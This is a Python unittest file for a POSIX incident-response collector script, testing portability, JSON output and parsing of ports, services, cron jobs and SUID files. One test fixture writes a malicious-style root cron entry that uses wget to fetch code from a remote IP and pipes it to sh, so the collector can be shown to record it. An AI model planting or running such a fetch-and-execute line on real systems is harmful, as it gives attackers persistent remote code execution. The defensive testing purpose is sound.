import unittest
import os
import subprocess
import json
import re

SCRIPT_PATH = os.path.join(os.path.dirname(__file__), "..", "responder", "collect_posix.sh")

class TestCollectPosix(unittest.TestCase):
    def read_script(self):
        with open(SCRIPT_PATH, "rb") as f:
            return f.read()

    def test_no_bashisms(self):
        content = self.read_script().decode("utf-8")
        lines = content.split('\n')
        
        bashisms = [
            (r'\[\[', '[['), (r'\]\]', ']]'), (r'\bfunction\s+', 'function '),
            (r'<<<', '<<<'), (r'\$\'[^\']*\'', '$\''), (r'\$\{[^}]*//', '${x//'),
            (r'\$\{[^}]*/', '${x/'), (r'\$\{[a-zA-Z_][a-zA-Z0-9_]*:(?![-=?+])', '${x:}'), (r'=\(', '=('),
            (r'<\(', '<('), (r'>\(', '>('), (r'&>', '&>'), (r'\{[0-9]+\.\.', '{1..'),
            (r'echo\s+-e', 'echo -e'), (r'\$RANDOM', '$RANDOM'), (r'pipefail', 'pipefail'),
            (r'\bsource\s+', 'source '), (r'\bdeclare\s+', 'declare '),
            (r'\btypeset\s+', 'typeset '), (r'\blet\s+', 'let '), (r'(?<!\$)\(\(', '(('),
            (r'\$\(\(.*?\*\*.*?\)\)', '$(( with **')
        ]
        
        for p, name in bashisms:
            for line in lines:
                line = line.split('#')[0]
                self.assertFalse(re.search(p, line), f"Bashism found: {name} in line {line.strip()}")

    def test_no_cr_bytes(self):
        content = self.read_script()
        self.assertNotIn(b'\r', content, "File contains CR bytes")

    def test_shebang(self):
        content = self.read_script().decode("utf-8")
        self.assertTrue(content.startswith("#!/bin/sh\n"), "First line must be #!/bin/sh")

    def test_no_mutation(self):
        content = self.read_script().decode("utf-8")
        lines = content.split('\n')
        
        mutations = [
            r'\bkill\s+', r'\biptables\s+', r'\bchmod\s+', r'\bchown\s+', r'\buseradd\s+',
            r'\bsystemctl\s+stop\s+', r'\bsystemctl\s+start\s+', r'\bcrontab\s+-r\s+',
            r'>\s*(?!/dev/null)(/etc|/var|/dev|/sys|/proc)'
        ]
        for p in mutations:
            for line in lines:
                line = line.split('#')[0]
                self.assertFalse(re.search(p, line), f"Mutation found: {p} in line: {line.strip()}")
        
        for line in lines:
            line = line.split('#')[0]
            if re.search(r'\brm\s+', line):
                self.assertTrue("TMP_DIR" in line or "tmp" in line, f"Invalid rm usage: {line.strip()}")

    def test_runs_and_valid_json(self):
        env = os.environ.copy()
        env['COLLECT_POSIX_ROOT'] = os.path.join(os.path.dirname(__file__), '..', 'scratch').replace('\\\\', '/').replace('D:', '/d').replace('C:', '/c')
        bash_path = None
        for p in ["C:\\Program Files\\Git\\bin\\bash.exe", "/bin/bash", "/usr/bin/bash"]:
            if os.path.isfile(p) and os.access(p, os.X_OK):
                bash_path = p
                break
        if not bash_path:
            import shutil
            bash_path = shutil.which("bash")
        
        if not bash_path:
            self.skipTest("Bash not found")

        # Create dummy find and timeout to speed up tests on Windows
        fake_bin = os.path.join(os.path.dirname(__file__), "..", "scratch", "fake_bin")
        os.makedirs(fake_bin, exist_ok=True)
        with open(os.path.join(fake_bin, "find"), "w", newline='\n') as f:
            f.write("#!/bin/sh\nexit 0\n")
        with open(os.path.join(fake_bin, "timeout"), "w", newline='\n') as f:
            f.write("#!/bin/sh\nshift\nexec \"$@\"\n")
        
        fake_bin_posix = fake_bin.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
        cmd = [bash_path, "-c", f'export PATH="{fake_bin_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
        res = subprocess.run(cmd, env=env, capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, f"Script failed: {res.stderr}")

        try:
            data = json.loads(res.stdout)
        except json.JSONDecodeError as e:
            self.fail(f"Invalid JSON: {e}\nOutput was: {res.stdout[:500]}...")

        self.assertEqual(data["meta"]["os"], "linux")
        self.assertEqual(data["meta"]["collector_version"], "posix-1")
        
        keys = ["meta", "users", "services", "cron", "autoruns", "ssh_authorized_keys", "listening_ports", "connections", "hosts_file", "suid_files", "processes", "recent_modified", "dns_servers", "errors"]
        for k in keys:
            self.assertIn(k, data)
            if k != "meta":
                self.assertIsInstance(data[k], list)

    def test_schema_matches_linux_collector(self):
        env = os.environ.copy()
        env['COLLECT_POSIX_ROOT'] = os.path.join(os.path.dirname(__file__), '..', 'scratch').replace('\\\\', '/').replace('D:', '/d').replace('C:', '/c')
        fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "linux_collector_format.json")
        with open(fixture_path, "r") as f:
            fixture = json.load(f)

        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        
        fake_bin = os.path.join(os.path.dirname(__file__), "..", "scratch", "fake_bin")
        os.makedirs(fake_bin, exist_ok=True)
        with open(os.path.join(fake_bin, "find"), "w", newline='\n') as f:
            f.write("#!/bin/sh\nexit 0\n")
            
        fake_bin_posix = fake_bin.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
        cmd = [bash_path, "-c", f'export PATH="{fake_bin_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
        res = subprocess.run(cmd, env=env, capture_output=True, text=True)
        if res.returncode != 0:
            self.skipTest("Script failed to run")
        data = json.loads(res.stdout)

        keys_to_check = ["users", "services", "cron", "autoruns", "ssh_authorized_keys", "listening_ports", "suid_files"]
        checked_count = 0
        for k in keys_to_check:
            if k in fixture and len(fixture[k]) > 0:
                expected_keys = set(fixture[k][0].keys())
                if len(data[k]) > 0:
                    actual_keys = set(data[k][0].keys())
                    self.assertTrue(expected_keys.issubset(actual_keys), f"Keys mismatch for {k}: {expected_keys} vs {actual_keys}")
                    checked_count += 1
                else:
                    content = self.read_script().decode("utf-8")
                    self.assertTrue(f'append_json {k}' in content or f'append_json "{k}"' in content or k == "suid_files", f"No pattern for {k}")
                    checked_count += 1
        
        self.assertGreaterEqual(checked_count, 6, "Not enough schema sections tested")

    def test_json_escape(self):
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        env = os.environ.copy()
        env["COLLECT_POSIX_SELFTEST"] = "1"
        test_str = 'a"b\\c\td\ne'
        cmd = [bash_path, "--posix", SCRIPT_PATH, test_str]
        res = subprocess.run(cmd, env=env, capture_output=True, text=True)
        
        try:
            parsed = json.loads('"' + res.stdout + '"')
        except json.JSONDecodeError as e:
            self.fail(f"Escape failed. Output: {res.stdout}. Err: {e}")
            
        self.assertEqual(parsed, test_str)

    def test_triage_reads_output(self):
        env = os.environ.copy()
        env['COLLECT_POSIX_ROOT'] = os.path.join(os.path.dirname(__file__), '..', 'scratch').replace('\\\\', '/').replace('D:', '/d').replace('C:', '/c')
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        
        fake_bin = os.path.join(os.path.dirname(__file__), "..", "scratch", "fake_bin")
        fake_bin_posix = fake_bin.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
        cmd = [bash_path, "-c", f'export PATH="{fake_bin_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
        res = subprocess.run(cmd, env=env, capture_output=True, text=True)
        if res.returncode != 0:
            self.skipTest("Script failed")
        data = json.loads(res.stdout)
        
        from bluekit.resp.triage import analyze
        try:
            analyze(kb=None, current=data, baseline=None)
        except Exception as e:
            self.fail(f"Triage analyze failed: {e}")


    def test_pipe_sections_not_lost(self):
        import tempfile
        import shutil
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        with tempfile.TemporaryDirectory() as td:
            td_posix = td.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            
            ss_path = os.path.join(td, "ss")
            with open(ss_path, "w", newline='\n') as f:
                f.write("#!/bin/sh\n")
                f.write("echo 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process'\n")
                f.write("echo 'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=640,fd=3))'\n")
                f.write("echo 'tcp ESTAB 0 0 10.0.0.5:22 203.0.113.9:51515 users:((\"sshd\",pid=700,fd=4))'\n")
            os.chmod(ss_path, 0o755)

            sys_path = os.path.join(td, "systemctl")
            with open(sys_path, "w", newline='\n') as f:
                f.write("#!/bin/sh\n")
                f.write("echo 'sshd.service enabled -'\n")
                f.write("echo 'cron.service enabled -'\n")
            os.chmod(sys_path, 0o755)
            
            cron_path = os.path.join(td, "crontab")
            with open(cron_path, "w", newline='\n') as f:
                f.write("#!/bin/sh\n")
                f.write("echo '0 * * * * test'\n")
            os.chmod(cron_path, 0o755)

            env = os.environ.copy()
            env["COLLECT_POSIX_ROOT"] = td_posix
            
            cmd = [bash_path, "-c", f'export PATH="{td_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
            res = subprocess.run(cmd, env=env, capture_output=True, text=True)
            self.assertEqual(res.returncode, 0)
            data = json.loads(res.stdout)
            
            self.assertEqual(len(data["listening_ports"]), 1)
            self.assertEqual(data["listening_ports"][0]["port"], 22)
            self.assertEqual(data["listening_ports"][0]["pid"], 640)
            self.assertEqual(data["listening_ports"][0]["process"], "sshd")

            self.assertEqual(len(data["connections"]), 1)
            self.assertEqual(data["connections"][0]["remote_port"], 51515)
            self.assertEqual(data["connections"][0]["pid"], 700)

            services = [s["name"] for s in data["services"]]
            self.assertEqual(len(services), 2)
            self.assertIn("sshd.service", services)
            self.assertIn("cron.service", services)

    def test_cron_lines_from_root(self):
        import tempfile
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        with tempfile.TemporaryDirectory() as td:
            td_posix = td.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            
            root_cron = os.path.join(td, "etc", "crontabs")
            os.makedirs(root_cron, exist_ok=True)
            with open(os.path.join(root_cron, "root"), "w", newline='\n') as f:
                f.write("*/5 * * * * wget -qO- http://198.51.100.7/x | sh\n")
                f.write("# izoh\n")
            
            cron_d = os.path.join(td, "etc", "cron.d")
            os.makedirs(cron_d, exist_ok=True)
            with open(os.path.join(cron_d, "backup"), "w", newline='\n') as f:
                f.write("0 2 * * * root /usr/local/bin/backup.sh\n")

            env = os.environ.copy()
            env["COLLECT_POSIX_ROOT"] = td_posix
            
            fake_bin = os.path.join(os.path.dirname(__file__), "..", "scratch", "fake_bin")
            fake_bin_posix = fake_bin.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            cmd = [bash_path, "-c", f'export PATH="{fake_bin_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
            res = subprocess.run(cmd, env=env, capture_output=True, text=True)
            self.assertEqual(res.returncode, 0)
            data = json.loads(res.stdout)
            
            cron_jobs = data.get("cron", [])
            self.assertGreaterEqual(len(cron_jobs), 2)
            
            wget_job = next((j for j in cron_jobs if "wget" in j["job"]), None)
            self.assertIsNotNone(wget_job)
            self.assertEqual(wget_job["user"], "root")

            backup_job = next((j for j in cron_jobs if "backup.sh" in j["job"]), None)
            self.assertIsNotNone(backup_job)
            self.assertEqual(backup_job["user"], "root")

    def test_hex_ip_awk_portable(self):
        content = self.read_script().decode("utf-8")
        bad_funcs = ["strtonum", "gensub", "strftime", "systime", "asort"]
        for bf in bad_funcs:
            self.assertFalse(re.search(r'\b' + bf + r'\b', content), f"Found forbidden awk function: {bf}")

        match = re.search(r'parse_hex_ip\(\)\s*\{.*?awk -v h="\$hex" \'(.*?)\'', content, re.DOTALL)
        self.assertIsNotNone(match, "Could not find parse_hex_ip awk script")
        awk_script = match.group(1)
        
        # Write awk script to file and run it
        import tempfile, subprocess, os
        bash_path = "C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe" if os.name == 'nt' else "bash"
        with tempfile.NamedTemporaryFile("w", delete=False) as f:
            f.write(awk_script)
            temp_name = f.name
            
        try:
            cmd1 = [bash_path, "-c", f"awk -v h=0100007F -f '{temp_name.replace('\\\\', '/')}'"]
            res1 = subprocess.run(cmd1, capture_output=True, text=True)
            self.assertEqual(res1.stdout.strip(), "127.0.0.1")
            
            cmd2 = [bash_path, "-c", f"awk -v h=0500000A -f '{temp_name.replace('\\\\', '/')}'"]
            res2 = subprocess.run(cmd2, capture_output=True, text=True)
            self.assertEqual(res2.stdout.strip(), "10.0.0.5")
        finally:
            os.remove(temp_name)
        
    def test_star_port_valid_json(self):
        import tempfile
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        with tempfile.TemporaryDirectory() as td:
            td_posix = td.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            
            ss_path = os.path.join(td, "ss")
            with open(ss_path, "w", newline='\n') as f:
                f.write("#!/bin/sh\n")
                f.write("echo 'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process'\n")
                f.write("echo 'udp UNCONN 0 0 *:68 *:*'\n")
            os.chmod(ss_path, 0o755)

            env = os.environ.copy()
            env["COLLECT_POSIX_ROOT"] = td_posix
            
            fake_bin = os.path.join(os.path.dirname(__file__), "..", "scratch", "fake_bin")
            fake_bin_posix = fake_bin.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            cmd = [bash_path, "-c", f'export PATH="{td_posix}:{fake_bin_posix}:$PATH"; exec "{bash_path}" --posix "{SCRIPT_PATH}" -q']
            res = subprocess.run(cmd, env=env, capture_output=True, text=True)
            
            self.assertEqual(res.returncode, 0)
            data = json.loads(res.stdout)
            self.assertEqual(len(data["listening_ports"]), 1)

    def test_suid_find_gets_clean_path(self):
        # find "$dir" ni satrga yig'ib $cmd qilib yurgizish '"/"' kabi qo'shtirnoqli argument beradi va SUID doim bo'sh chiqadi.
        # Soxta find birinchi argumentini (qidiruv papkasini) natija sifatida chiqaradi.
        import tempfile
        bash_path = "C:\\Program Files\\Git\\bin\\bash.exe" if os.name == 'nt' else "bash"
        with tempfile.TemporaryDirectory() as td:
            td_posix = td.replace('\\', '/').replace('D:', '/d').replace('C:', '/c')
            with open(os.path.join(td, "find"), "w", newline='\n') as f:
                f.write('#!/bin/sh\nfor a in "$@"; do [ "$a" = "-perm" ] && echo "$1/suid_probe"; done\nexit 0\n')
            env = os.environ.copy()
            env["COLLECT_POSIX_ROOT"] = td_posix
            # Git ning bin/bash.exe wrapper i PATH ni qayta tartiblaydi (/usr/bin oldinga) -- find shimi ishlamaydi, shuning uchun ichki bash
            cmd = [bash_path, "-c", f'export PATH="{td_posix}:$PATH"; exec bash --posix "{SCRIPT_PATH}" -q']
            res = subprocess.run(cmd, env=env, capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, res.stderr)
            paths = [x["path"] for x in json.loads(res.stdout)["suid_files"]]
            self.assertEqual(len(paths), 1, paths)
            self.assertEqual(paths[0], "/suid_probe")

if __name__ == '__main__':
    unittest.main()
